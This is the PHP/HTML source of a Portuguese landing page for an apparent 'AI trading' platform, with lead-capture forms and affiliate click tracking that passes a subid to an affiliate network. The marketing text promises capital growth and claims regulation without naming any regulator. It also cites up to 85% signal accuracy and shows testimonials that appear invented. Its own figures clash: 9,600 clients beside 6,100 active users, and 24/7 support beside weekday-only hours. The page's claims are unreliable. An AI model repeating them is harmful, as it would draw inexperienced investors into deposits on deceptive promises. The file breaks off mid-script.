<?php
require_once __DIR__ . '/includes/config.php';
$page_title = page_title('IA e execução em tempo real | Site Oficial');
$page_description = SITE_NAME . ' — tecnologia de IA que analisa mercados e executa ordens em tempo real, com um analista pessoal ao seu lado para construir uma nova fonte de renda.';
$page_canonical = page_url();
$active_page = 'home';
require __DIR__ . '/includes/head.php';
?>
<a class="skip-link" href="#top">Saltar para o conteúdo</a><style>.skip-link{position:absolute;left:-9999px;top:0;z-index:1000;background:#111;color:#fff;padding:.6rem 1rem;border-radius:0 0 .4rem 0}.skip-link:focus{left:0}</style>

<header class="site-head">
 <div class="shell nav">
 <a class="brand" href="#top"><img src="<?= asset('static/img/brand/logo.webp') ?>" alt="<?= e(SITE_NAME) ?>" width="30" height="30" decoding="async" loading="eager"><?= e(SITE_NAME) ?></a>
 <nav class="nav-links" id="navLinks" aria-label="Principal">
 <a href="#platform">Produto</a>
 <a href="#how">Como funciona.</a>
 <a href="#markets">Mercados em tempo real</a>
 <a href="#faq">FAQ</a>
 </nav>
 <div class="nav-cta">
 <a class="btn btn-primary" href="#signup">Abra sua conta</a>
 <button class="nav-toggle" aria-label="Abrir menu" aria-expanded="false" aria-controls="navLinks" type="button">
 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
 </button>
 </div>
 </div>
</header>

<main id="top">

<!-- HERO — left: copy + trust chips + CTA · right: lead form (same layout as the reference) -->
<section class="hero" id="hero" aria-labelledby="hero-title">
 <div class="shell hero-grid">
 <div>
 <span class="eyebrow">IA em tempo real + análise humana</span>
 <h1><span class="brandword"><?= e(SITE_NAME) ?></span> — invista agora, veja seu capital crescer</h1>
 <p class="hero-sub">Um motor de inteligência artificial escaneia os mercados e executa ordens em frações de segundo, enquanto seu analista pessoal ajusta cada decisão ao seu perfil. Sem experiência necessária — é guiado do início ao fim.</p><!--hero-trust--><div style="margin:1.5rem -.7rem 1.6rem;font-size:.85rem;font-weight:500;line-height:1.7;color:var(--muted,#9aa3b2)"><span style="display:inline-flex;align-items:center;gap:.4rem;margin:.3rem .7rem;vertical-align:middle"><span aria-hidden="true">🛡</span>Regulado</span><span style="display:inline-flex;align-items:center;gap:.4rem;margin:.3rem .7rem;vertical-align:middle"><span aria-hidden="true">🔒</span>Fundos segregados</span><span style="display:inline-flex;align-items:center;gap:.4rem;margin:.3rem .7rem;vertical-align:middle"><span aria-hidden="true">👥</span>9.600 clientes</span><span style="display:inline-flex;align-items:center;gap:.4rem;margin:.3rem .7rem;vertical-align:middle"><span aria-hidden="true" style="color:var(--accent,#e8b84b)">★</span><span style="font-variant-numeric:tabular-nums">4.8</span> avaliação</span></div>
 <div class="hero-chips">
 <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>Protegido por SSL</span>
 <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>Apoio 24/7</span>
 <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>Execução rápida</span>
 </div>
 <div class="hero-cta">
 <a class="btn btn-primary" href="#hero-form">Comece agora — <?= e(MIN_DEPOSIT) ?> <?= e(CURRENCY) ?> mín.</a>
 </div>
 </div>
 <div class="lead" id="hero-form">
 <h2 id="hero-title">Abra sua conta</h2>
 <p class="sub">Comece em poucos minutos.</p>
 <?php
  $form_id = 'hero-form';
  $form_heading = null;
  $form_subtitle = null;
  $form_submit = 'Quero começar';
  $form_class = 'leadform lead-form helios-form';
  require __DIR__ . '/includes/form.php';
?>
 </div>
 </div>
</section>

<!-- STATS — number (big) + label (small) -->
<section class="sec-sm" aria-label="Indicadores-chave">
 <div class="shell stats">
 <div class="stat"><b>6.100</b><span>Usuários ativos</span></div>
 <div class="stat"><b><?= e(CURRENCY) ?> 2,0B</b><span>Volume negociado</span></div>
 <div class="stat"><b>99,1%</b><span>Disponibilidade dos sinais</span></div>
 <div class="stat"><b>24/7</b><span>Suporte</span></div>
 </div>
</section>

<!-- PLATFORM — left: copy + bullets + CTA · right: phone mockup (device) -->
<section class="sec" id="platform" aria-labelledby="platform-title">
 <div class="shell platform-grid">
 <div>
 <span class="eyebrow">Por dentro da <?= e(SITE_NAME) ?></span>
 <h2 id="platform-title">Acompanhe sua conta em tempo real</h2>
 <p class="lede">Cada ordem executada pelo seu analista é registrada aqui — entradas, saídas e resultados verificados em cada par, transmitidos ao vivo.</p>
 <ul class="platform-points">
 <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg><span>Gráficos de candles e profundidade em tempo real, em qualquer dispositivo</span></li>
 <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg><span>Envio de ordens com um toque e confirmação instantânea</span></li>
 <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg><span>Listas de acompanhamento e alertas de preço que seguem</span></li>
 </ul>
 <a class="btn btn-primary" href="#hero-form" style="margin-top:26px">Começar agora</a>
 </div>
 <figure class="platform-media">
 <img class="phone-shot" src="<?= asset('static/img/brand/phone.webp') ?>" width="760" height="1180" decoding="async" alt="<?= e(SITE_NAME) ?> — BTC/USDT live candlestick chart, order book and one-tap Buy/Sell on mobile" loading="eager" fetchpriority="high">
 <figcaption class="phone-cap"><?= e(SITE_NAME) ?> — trading móvel com gráficos de criptomoedas em tempo real</figcaption>
 </figure>
 </div>
</section>

<!-- FEATURES -->
<section class="sec" id="features" aria-labelledby="features-title">
 <div class="shell">
 <div class="sec-head"><span class="eyebrow">A plataforma</span><h2 id="features-title">Tudo que precisa, numa só plataforma veloz.</h2><p class="lede">Sem gráficos para vigiar, sem ordens para cronometrar. O motor da <?= e(SITE_NAME) ?> monitora livros de ofertas em tempo real em exchanges de criptomoedas, APIs de ações globais e os principais pares de forex — e dispara ordens no instante em que os modelos encontram uma configuração vantajosa.</p></div>
 <div class="grid feat-grid" style="margin-top:36px">
 <div class="card feat">
 <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8v4l3 2"/></svg></div>
 <h3>Execução em frações de segundo em cada praça conectada</h3><p>A <?= e(SITE_NAME) ?> mantém conexões de API de baixa latência com cada exchange suportada. Quando o modelo dispara um sinal, a ordem é roteada, executada e registrada no seu painel antes do próximo tick.</p>
 </div>
 <div class="card feat">
 <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8v4l3 2"/></svg></div>
 <h3>Ativa 24 horas por dia, em todas as sessões</h3><p>O mercado cripto nunca dorme, e o motor da <?= e(SITE_NAME) ?> também não. Ele continua escaneando pares durante fins de semana e feriados, para si nunca perder uma janela.</p>
 </div>
 <div class="card feat">
 <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8v4l3 2"/></svg></div>
 <h3>Relatórios em múltiplas moedas</h3><p>Cada saldo, cada ordem, cada retirada aparece na sua moeda local. Nenhuma etapa oculta de conversão.</p>
 </div>
 <div class="card feat">
 <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8v4l3 2"/></svg></div>
 <h3>Capital segregado</h3><p>Seus recursos permanecem na sua própria conta. A <?= e(SITE_NAME) ?> nunca tem custódia — o motor apenas tem permissão para rotear ordens.</p>
 </div>
 <div class="card feat">
 <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8v4l3 2"/></svg></div>
 <h3>Segurança de nível bancário</h3><p>Criptografia TLS em toda a plataforma, autenticação em duas etapas por padrão e auditorias trimestrais de infraestrutura por terceiros. Recibos de operações registrados em blockchain.</p>
 </div>
 <div class="card feat">
 <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8v4l3 2"/></svg></div>
 <h3>Três classes de ativos, uma só plataforma</h3><p>A maioria das plataformas de varejo limita a um único mercado. A <?= e(SITE_NAME) ?> opera cripto, ações listadas e os principais pares de forex no mesmo painel.</p>
 </div>
 <div class="card feat">
 <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8v4l3 2"/></svg></div>
 <h3>Limites de risco predefinidos em cada posição</h3><p>Stop-loss, drawdown máximo e limites de alocação de capital são configurados por classe de ativo. O motor sai automaticamente de qualquer operação que cruze um limite, e o evento é registrado no seu histórico de auditoria.</p>
 </div>
 </div>
 </div>
</section>

<!-- MARKETS — left: copy + CTA · right: LIVE markets card (real prices from a public API) -->
<section class="sec" id="markets" aria-labelledby="markets-title">
 <div class="shell markets-grid">
 <div>
 <span class="eyebrow">Mercados em tempo real</span>
 <h2 id="markets-title">Opere Bitcoin, Ethereum e muito mais</h2>
 <p class="lede">Preços em tempo real, indicadores avançados e uma visão profissional dos mercados que interessam a si.</p>
 <a class="btn btn-primary" href="#hero-form" style="margin-top:26px">Quero acesso aos mercados</a>
 </div>
 <div class="mkt-card">
 <div class="mkt-head"><span>Mercados</span><span class="mkt-live"><i></i>Direto</span></div>
 <div class="mkt-list">
 <div class="mkt-row" data-sym="BTC"><div class="mkt-c"><b>BTC</b><span>BTC/USDT</span></div><div class="mkt-p"><b class="px"><?= e(CURRENCY) ?> 64.671</b><span class="chg down">-1,06%</span></div></div>
 <div class="mkt-row" data-sym="ETH"><div class="mkt-c"><b>ETH</b><span>ETH/USDT</span></div><div class="mkt-p"><b class="px"><?= e(CURRENCY) ?> 1.881</b><span class="chg down">-2,55%</span></div></div>
 <div class="mkt-row" data-sym="SOL"><div class="mkt-c"><b>SOL</b><span>SOL/USDT</span></div><div class="mkt-p"><b class="px"><?= e(CURRENCY) ?> 76,62</b><span class="chg down">-1,72%</span></div></div>
 <div class="mkt-row" data-sym="XRP"><div class="mkt-c"><b>XRP</b><span>XRP/USDT</span></div><div class="mkt-p"><b class="px"><?= e(CURRENCY) ?> 1,11</b><span class="chg down">-0,97%</span></div></div>
 </div>
 </div>
 </div>
</section>

<!-- HOW IT WORKS -->
<section class="sec" id="how" aria-labelledby="how-title">
 <div class="shell">
 <div class="sec-head"><span class="eyebrow">Como funciona</span><h2 id="how-title">Como funciona.</h2><p class="lede">Tecnologia de ponta e um analista humano de verdade, trabalhando juntos em tempo real, para ajudar a construir uma nova fonte de renda — com orientação em cada etapa.</p></div>
 <div class="steps" style="margin-top:36px">
 <div class="step"><div class="n">1</div><h3>Crie sua conta</h3><p>Cadastre-se em minutos usando apenas seu e-mail.</p></div>
 <div class="step"><div class="n">2</div><h3>Confirme seu e-mail</h3><p>Verifique seu endereço para proteger sua conta.</p></div>
 <div class="step"><div class="n">3</div><h3>Deposite na sua conta</h3><p>Adicione fundos a partir de <?= e(MIN_DEPOSIT) ?> <?= e(CURRENCY) ?> do seu jeito.</p></div>
 <div class="step"><div class="n">4</div><h3>Defina sua estratégia</h3><p>Escolha seus objetivos; seu analista personaliza o plano.</p></div>
 <div class="step"><div class="n">5</div><h3>Comece a operar</h3><p>Siga os sinais guiados e cresça no seu ritmo.</p></div>
 </div>
 </div>
</section>

<!-- PAYMENT -->
<section class="sec-sm" id="payment" aria-labelledby="payment-title">
 <div class="shell">
 <div class="sec-head"><span class="eyebrow">Depósitos</span><h2 id="payment-title">Deposite com métodos que já conhece</h2><p class="lede">Deposite e retire por canais seguros e familiares — sem taxas escondidas.</p></div>
 <div class="pay-list">
 <div class="pay"><svg class="fai" aria-hidden="true" viewBox="0 0 576 512"><use href="#i-cc-visa"/></svg>Visa</div>
 <div class="pay"><svg class="fai" aria-hidden="true" viewBox="0 0 576 512"><use href="#i-cc-mastercard"/></svg>Mastercard</div>
 <div class="pay"><svg class="fai" aria-hidden="true" viewBox="0 0 576 512"><use href="#i-cc-paypal"/></svg>PayPal</div>
 <div class="pay"><svg class="fai" aria-hidden="true" viewBox="0 0 576 512"><use href="#i-cc-apple-pay"/></svg>Apple Pay</div>
 <div class="pay"><svg class="fai" aria-hidden="true" viewBox="0 0 640 512"><use href="#i-google-pay"/></svg>Google Pay</div>
 <div class="pay"><svg class="fai" aria-hidden="true" viewBox="0 0 512 512"><use href="#i-building-columns"/></svg>Transferência bancária</div>
 <div class="pay"><svg class="fai" aria-hidden="true" viewBox="0 0 640 512"><use href="#i-money-bill-transfer"/></svg>SEPA</div>
 <div class="pay"><svg class="fai" aria-hidden="true" viewBox="0 0 512 512"><use href="#i-bitcoin"/></svg>USDT</div>
 </div>
 </div>
</section>

<!-- TESTIMONIALS -->
<section class="sec" id="reviews" aria-labelledby="reviews-title">
 <div class="shell">
 <div class="sec-head"><span class="eyebrow">O que dizem os membros</span><h2 id="reviews-title">O que nossos investidores dizem</h2></div>
 <div class="grid testi" style="margin-top:36px">
 <div class="card"><p>“Meu analista me explicou tudo com clareza. Defini meus objetivos uma única vez, e agora acompanho exatamente como meu capital está crescendo — sem ficar ansioso a cada movimento.”</p><div class="who"><div class="ini">C</div><div><b>Carolina Machado</b><span>São Paulo, SP</span></div></div></div>
 <div class="card"><p>“Nunca havia investido antes — meu analista cuidou da estratégia e explicou cada passo. Sem promessas vazias, sem pressão, e os saques chegam quando esperado.”</p><div class="who"><div class="ini">F</div><div><b>Felipe Santos</b><span>Rio de Janeiro, RJ</span></div></div></div>
 <div class="card"><p>“Comecei com pouco para testar. A transparência e o suporte me deram segurança para continuar construindo a partir daí.”</p><div class="who"><div class="ini">B</div><div><b>Beatriz Lima</b><span>Belo Horizonte, MG</span></div></div></div>
 <div class="card"><p>“As análises chegam até mim — aprovo ou ajusto em minutos. Encaixa perfeitamente na minha rotina, sem atrapalhar o trabalho.”</p><div class="who"><div class="ini">L</div><div><b>Lucas Ferreira</b><span>Brasília, DF</span></div></div></div>
 <div class="card"><p>“O que me conquistou foi a transparência: cada decisão é explicada, e vejo o raciocínio antes de qualquer coisa acontecer.”</p><div class="who"><div class="ini">G</div><div><b>Gabriela Costa</b><span>Salvador, BA</span></div></div></div>
 <div class="card"><p>“O suporte é de verdade e sempre acessível. Minha primeira análise foi feita mão na massa, e a plataforma tem sido firme e previsível desde então.”</p><div class="who"><div class="ini">R</div><div><b>Roberto Oliveira</b><span>Curitiba, PR</span></div></div></div>
 </div>
 </div>
</section>

<!-- CAPABILITIES — spec table (label | value), last row highlighted with a contact link -->
<section class="sec" id="capabilities" aria-labelledby="capabilities-title">
 <div class="shell">
 <div class="sec-head"><span class="eyebrow">Plataforma</span><h2 id="capabilities-title">Principais recursos, em resumo</h2></div>
 <div class="spec">
 <div class="spec-row">
 <div class="spec-k">Motor de IA</div>
 <div class="spec-v">Análise avançada de mercado com aprendizado de máquina</div>
 </div>
 <div class="spec-row">
 <div class="spec-k">Formas de depósito</div>
 <div class="spec-v">Cartão de crédito, transferência bancária, PayPal, carteiras digitais</div>
 </div>
 <div class="spec-row">
 <div class="spec-k">Acesso multiplataforma</div>
 <div class="spec-v">Web, tablet e celular — totalmente responsivo</div>
 </div>
 <div class="spec-row">
 <div class="spec-k">Precisão dos sinais</div>
 <div class="spec-v">Até 85% nas estratégias de IA suportadas</div>
 </div>
 <div class="spec-row">
 <div class="spec-k">Mercados</div>
 <div class="spec-v">Criptomoedas, forex, ações e commodities</div>
 </div>
 <div class="spec-row">
 <div class="spec-k">Cadastro</div>
 <div class="spec-v">Abertura de conta rápida com verificação guiada</div>
 </div>
 <div class="spec-row spec-row--hl">
 <div class="spec-k">Suporte</div>
 <div class="spec-v">Atendimento profissional 24 horas por dia — <a href="<?= page_url('contacts.php') ?>">Enviar mensagem</a></div>
 </div>
 </div>
 </div>
</section>

<!-- FAQ -->
<section class="sec" id="faq" aria-labelledby="faq-title">
 <div class="shell">
 <div class="sec-head" style="text-align:center;margin:0 auto"><span class="eyebrow">Dúvidas</span><h2 id="faq-title">Perguntas frequentes.</h2></div>
 <div class="faq" style="margin-top:34px">
 <details open><summary>Qual é o depósito mínimo?</summary><p>Abre e financia sua conta a partir do depósito mínimo. Pode adicionar saldo ao longo do tempo conforme seu plano avança.</p></details>
 <details><summary>Como funcionam os saques?</summary><p>Solicite um saque a qualquer momento pelo painel. Os fundos retornam ao método de pagamento escolhido, respeitando os prazos padrão de processamento.</p></details>
 <details><summary>Meu dinheiro está seguro?</summary><p>As contas são protegidas com segurança de padrão industrial e verificação rigorosa. Como em todo investimento, seu capital está em risco e valores podem cair tanto quanto subir.</p></details>
 <details><summary>Com que rapidez posso começar?</summary><p>A maioria dos membros conclui o registro em poucos minutos. Assim que seu primeiro depósito é confirmado, ativa um plano imediatamente.</p></details>
 <details><summary>Há taxas escondidas?</summary><p>Os custos são mostrados com transparência antes de si se comprometer. Sempre saberá exatamente o que se aplica ao seu plano — nenhuma cobrança surpresa.</p></details>
 <details><summary>Qual é a idade mínima para se registrar?</summary><p>Deve ter pelo menos 18 anos para abrir uma conta e investir. Verificação pode ser exigida para confirmar sua idade e identidade.</p></details>
 <details><summary>Quais métodos de pagamento são suportados?</summary><p>Métodos comuns como cartão de débito e crédito, transferência bancária, e-wallets selecionadas e criptomoedas são suportados. As opções exatas aparecem no passo de depósito.</p></details>
 <details><summary>Quando o suporte ao cliente está disponível?</summary><p>Nossa equipe de suporte funciona de segunda a sexta, das 9h às 18h, e se compromete a responder cada solicitação em até um dia útil.</p></details>
 <details><summary>Como são tratados os impostos?</summary><p>Os impostos sobre ganhos de investimento dependem das regras do seu país e são sua responsabilidade. Recomendamos manter registros e consultar um consultor fiscal qualificado.</p></details>
 <details><summary>O que é KYC e por que é obrigatório?</summary><p>KYC (Conheça Seu Cliente) é uma verificação padrão da sua identidade. Mantém contas seguras e faz parte da abertura de qualquer conta de investimento.</p></details>
 <details><summary>Preciso ter experiência?</summary><p>Não. Cada membro recebe um analista financeiro pessoal que o orienta a cada passo, então não precisa de conhecimento prévio de mercados.</p></details>
 <details><summary>Quem gerencia meus investimentos?</summary><p>Um analista financeiro dedicado, apoiado por ferramentas de IA, trabalhando em torno de seus objetivos e nível de risco. O analista combina expertise profissional com tecnologia — as decisões permanecem humanas.</p></details>
 <details><summary>A plataforma é regulamentada?</summary><p>Sim — atende aos padrões financeiros e de cibersegurança nacionais, com proteção de conta e verificação rigorosa integradas.</p></details>
 <details><summary>Posso adicionar saldo depois?</summary><p>Sim. Pode aportar na sua conta a qualquer momento e ajustar seu plano com seu analista conforme seus objetivos evoluem.</p></details>
 </div>
 </div>
</section>

<!-- FINAL CTA — left: headline + lede · right: lead form (same split as the hero) -->
<!--reviews-block--><section aria-label="Client ratings" style="padding:3rem 1.25rem;background:var(--bg,#0b0f19)"><div style="max-width:68rem;margin:0 auto;background:var(--surface,#12182a);border:1px solid var(--border,rgba(255,255,255,.08));border-radius:18px;padding:24px 34px;display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:18px 42px"><div style="text-align:center"><span style="display:inline-block;background:var(--accent,#e8b84b);color:var(--on-accent,#0b0d14);font:700 11px/1 Sora,system-ui,sans-serif;letter-spacing:.14em;padding:7px 12px;border-radius:6px;margin-bottom:10px">DE CONFIANÇA</span><div style="font:700 1.2rem Sora,system-ui,sans-serif;color:var(--text,#fff)"><?= e(SITE_NAME) ?> Avaliações</div></div><div style="font:800 2.7rem Sora,system-ui,sans-serif;color:var(--accent,#e8b84b);line-height:1;font-variant-numeric:tabular-nums">4.8</div><span style="position:relative;display:inline-block;font-size:1.55rem;line-height:1;letter-spacing:.1em" aria-hidden="true"><span style="color:var(--gold,#efb567);opacity:.25">★★★★★</span><span style="position:absolute;inset:0;overflow:hidden;white-space:nowrap;width:96.0%;color:var(--gold,#efb567)">★★★★★</span></span><div style="color:var(--muted,#9aa3b2);font-size:.95rem;font-variant-numeric:tabular-nums"><b style="color:var(--text,#fff)">389</b> avaliações · Com base em <b style="color:var(--text,#fff)">2.334</b> classificações</div></div></section><section class="sec" id="signup" aria-labelledby="signup-title">
 <div class="shell cta-grid">
 <div>
 <span class="eyebrow">Comece agora</span>
 <h2 id="signup-title" class="cta-h">Abra sua conta.</h2>
 <p class="lede">Diga-nos como entrar em contato e um especialista vai ajudar a dar o primeiro passo.</p>
 </div>
 <div class="lead" id="signup-form">
 <h3>Abra sua conta</h3>
 <p class="sub">Comece em poucos minutos.</p>
 <?php
  $form_id = 'signup-form';
  $form_heading = null;
  $form_subtitle = null;
  $form_submit = 'Quero começar';
  $form_class = 'leadform lead-form helios-form';
  require __DIR__ . '/includes/form.php';
?>
 </div>
 </div>
</section>

</main>

<!-- FOOTER -->
<footer class="foot">
 <div class="shell">
 <div class="foot-top">
 <div>
 <a class="brand" href="#top"><img src="<?= asset('static/img/brand/logo.webp') ?>" alt="<?= e(SITE_NAME) ?>" width="30" height="30" decoding="async" loading="eager"><?= e(SITE_NAME) ?></a>
 <p>Velocidade de IA, decisão humana. Capital em risco — invista com responsabilidade.</p>
 </div>
 <div><h4>Produto</h4><div class="foot-links">
 <a href="#platform">Acompanhe sua conta em tempo real</a><a href="#markets">Mercados em tempo real</a><a href="#how">Como funciona.</a><a href="#faq">FAQ</a>
 </div></div>
 <div><h4>Empresa</h4><div class="foot-links">
 <a href="<?= page_url('product.php') ?>">Sobre</a><a href="<?= page_url('offer.php') ?>">Preços</a><a href="<?= page_url('contacts.php') ?>">Contacto</a>
 </div></div>
 <div><h4>Legal</h4><div class="foot-links">
 <a href="<?= page_url('privacy.php') ?>">Privacidade</a><a href="<?= page_url('conditions.php') ?>">Termos</a><a href="<?= page_url('conditions.php') ?>">Divulgação de Riscos</a><a href="<?= page_url('contacts.php') ?>">Denunciar abuso</a>
 </div></div>
 </div>
 <div class="foot-bottom">© <span id="yr"></span> <?= e(SITE_NAME) ?>. Todos os direitos reservados. Investir envolve risco, incluindo possível perda de capital. · Investir envolve risco, incluindo a possível perda de parte ou de todo o capital investido. O valor dos investimentos pode subir ou cair, e pode receber de volta menos do que aplicou inicialmente. Não invista dinheiro que não pode perder.</div>
 </div>
</footer>
<script>document.getElementById('yr').textContent=new Date().getFullYear();</script>
<script>/*rates*/(function(){
function money(n){n=+n;return 'R$'+n.toLocaleString('pt-BR',{maximumFractionDigits:n>=1000?0:(n>=1?2:4)});}
function apply(rates){rates.forEach(function(r){document.querySelectorAll('[data-sym="'+r.sym+'"]').forEach(function(el){var px=el.querySelector('.px'),chg=el.querySelector('.chg');if(px)px.textContent=money(r.price);if(chg){var up=(+r.pct)>=0;chg.textContent=(up?'+':'')+Number(r.pct).toFixed(2)+'%';chg.className='chg '+(up?'up':'down');}});});}
function load(){fetch('/api/rates',{cache:'no-store'}).then(function(r){return r.json();}).then(function(d){if(d&&d.rates)apply(d.rates);}).catch(function(){});}
load();setInterval(load,60000);
})();</script>

<script>
(function () {
 var MSG_WAIT = "Aguarde, por favor\u2026";
 var MSG_ERR = "N\u00e3o foi poss\u00edvel enviar seus dados agora. Tente novamente.";
 var THANKS = "/thanks/";
 function rand(){ return (Math.random().toString(36).substring(2,12)+Math.random().toString(36).substring(2,6)).replace(/[^a-z0-9]/g,'').substring(0,16); }
 // one-time spinner CSS for the submit button's processing state
 if (!document.getElementById('ldf-spin-css')) {
 var _st = document.createElement('style'); _st.id = 'ldf-spin-css';
 _st.textContent = '.ldf-spin{display:inline-block;width:1em;height:1em;margin-right:.5em;vertical-align:-.15em;border:2px solid currentColor;border-right-color:transparent;border-radius:50%;animation:ldfspin .6s linear infinite}@keyframes ldfspin{to{transform:rotate(360deg)}}';
 (document.head || document.documentElement).appendChild(_st);
 }
 var p = new URLSearchParams(location.search);
 // our click subid → hidden field → send.php click_id → iRev aff_sub3. Accept the
 // common tracker param names so whatever the traffic source appends is captured.
 var subid = p.get('subid') || p.get('sub_id') || p.get('clickid') || p.get('click_id')
 || p.get('cid') || p.get('utm_content')
 || (window.KTracking && KTracking.getSubId ? KTracking.getSubId() : '') || '';
 document.querySelectorAll('form[data-leadform]').forEach(function (form) {
 var tok = form.querySelector('.js-token');
 var tsf = form.querySelector('.js-ts');
 var loadTime = Date.now();
 if (tsf) tsf.value = String(loadTime);
 // Anti-bot: the js_token is written ONLY after a genuine human interaction with
 // the form (focus/key/pointer). A script that POSTs the form without ever
 // touching it never gets a token, and the edge worker rejects tokenless posts.
 var armed = false;
 function arm(){ if (armed) return; armed = true; if (tok && !tok.value) tok.value = rand(); }
 ['focusin','keydown','pointerdown','touchstart'].forEach(function (ev) {
 form.addEventListener(ev, arm, { once: true, passive: true });
 });
 var dom = form.querySelector('.js-domain'); if (dom && !dom.value) dom.value = location.hostname;
 var sub = form.querySelector('.js-subid'); if (sub && subid) sub.value = subid; // only if a URL subid; else t.js fills it
 var phone = form.querySelector('input[type=tel]');
 var sending = false;
 function lock(b){ if(!b) return; b.dataset.lbl = b.dataset.lbl || b.innerHTML; b.disabled = true; b.setAttribute('aria-busy','1'); b.style.opacity='.75'; b.style.cursor='progress'; b.innerHTML='<span class="ldf-spin" aria-hidden="true"></span>'+MSG_WAIT; }
 function unlock(b){ if(!b) return; b.disabled=false; b.removeAttribute('aria-busy'); b.style.opacity=''; b.style.cursor=''; if(b.dataset.lbl) b.innerHTML=b.dataset.lbl; }
 function err(msg){ var el=form.querySelector('[data-leaderr]'); if(!el){ el=document.createElement('p'); el.setAttribute('data-leaderr','1'); el.style.cssText='margin-top:.6rem;font-size:.85rem;line-height:1.35;color:#f87171;text-align:center'; form.appendChild(el);} el.textContent=msg; }
 form.addEventListener('submit', async function (e) {
 e.preventDefault();
 if (sending) return;
 sending = true;
 // stamp the client-measured dwell (ms since load) → the worker rejects
 // instant/near-instant submits that no human could produce.
 if (tsf) tsf.value = String(Date.now() - loadTime);
 var iti = (phone && window.intlTelInputGlobals) ? window.intlTelInputGlobals.getInstance(phone) : null;
 if (iti) {
 // separateDialCode expects a NATIONAL number in the field. If the user ALSO typed the
 // country code (e.g. 351961654221 with the +351 selector) it would double to
 // +351351…; when that makes the number invalid, re-parse the raw digits as a full
 // international number so the country code isn't added twice.
 try {
 var dc = (iti.getSelectedCountryData() || {}).dialCode || '';
 var raw = (phone.value || '').replace(/[^\d+]/g, '');
 if (raw && raw.charAt(0) !== '+' && dc && raw.indexOf(dc) === 0 && !iti.isValidNumber()) {
 iti.setNumber('+' + raw);
 }
 } catch (e3) {}
 try { phone.value = iti.getNumber() || phone.value; } catch (e4) {}
 var cc = form.querySelector('[name=country]'), d = iti.getSelectedCountryData();
 if (cc && d && d.iso2) cc.value = d.iso2.toUpperCase();
 }
 var btn = form.querySelector('button[type=submit]'); lock(btn);
 var prev = form.querySelector('[data-leaderr]'); if (prev) prev.textContent = '';
 try {
 var r = await fetch(form.action, { method: 'POST', body: new FormData(form), headers: { Accept: 'application/json' } });
 var data = await r.json().catch(function () { return {}; });
 var dest = data && data.redirect_url;
 if (dest === '/thanks/' || dest === '/thanks') dest = THANKS;
 if (dest) { location.href = dest; return; }
 if (data && data.success) { location.href = THANKS; return; }
 sending = false; unlock(btn);
 err((data && data.error) || MSG_ERR);
 } catch (e2) {
 sending = false; unlock(btn);
 err(MSG_ERR);
 }
 });
 });
})();
</script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.min.css" media="print" onload="this.media='all'"><noscript></noscript>
<style>
.iti{width:100%}.iti input,.iti input[type=tel]{width:100%}
/* The dropdown has a white background but inherits the design's body text colour
 (light, for dark themes) → country names render white-on-white (invisible). Force
 a readable light dropdown that the design's CSS can't override. !important beats
 the inherited colour regardless of the design. */
.iti__country-list{background:#fff!important;color:#1b1b1b!important;border:1px solid #e5e7eb;
 box-shadow:0 8px 28px rgba(0,0,0,.18);max-height:230px}
.iti__country,.iti__country-name{color:#1b1b1b!important}
.iti__dial-code{color:#6b7280!important}
.iti__country.iti__highlight,.iti__country:hover{background:#eef2ff!important}
.iti__flag-box{margin-right:8px!important}
</style>
<script>
(function () {
 var phones = document.querySelectorAll('form[data-leadform] input[type=tel]');
 if (!phones.length) return;
 var loading = false, loaded = false;
 function init() {
 phones.forEach(function (input) {
 if (input.dataset.itiReady) return;
 input.dataset.itiReady = '1';
 var form = input.closest('form');
 var hid = form ? form.querySelector('[name=phone_country]') : null;
 window.intlTelInput(input, {
 initialCountry: (hid && hid.value) || 'br',
 separateDialCode: true,
 utilsScript: 'https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/utils.js'
 });
 });
 }
 // Lazy: pull the widget (incl. the 58 KB utils.js) only when the visitor first
 // touches a phone field — keeps it off the critical path (FCP/LCP) while still
 // ready before they can finish typing a number.
 function load() {
 if (loaded) { init(); return; }
 if (window.intlTelInput) { loaded = true; init(); return; }
 if (loading) return; loading = true;
 var s = document.createElement('script');
 s.src = 'https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js';
 s.onload = function () { loaded = true; init(); };
 document.head.appendChild(s);
 }
 // Init immediately so the flag + dial code show on load (this script is at the end
 // of <body>, so it never blocks first paint). The heavy utils.js is still fetched
 // asynchronously by the widget AFTER init, keeping it off the critical render path.
 load();
 phones.forEach(function (input) {
 input.addEventListener('focus', load);
 input.addEventListener('touchstart', load, { passive: true });
 });
})();
</script>
<script>/*anim-failsafe*/
(function () {
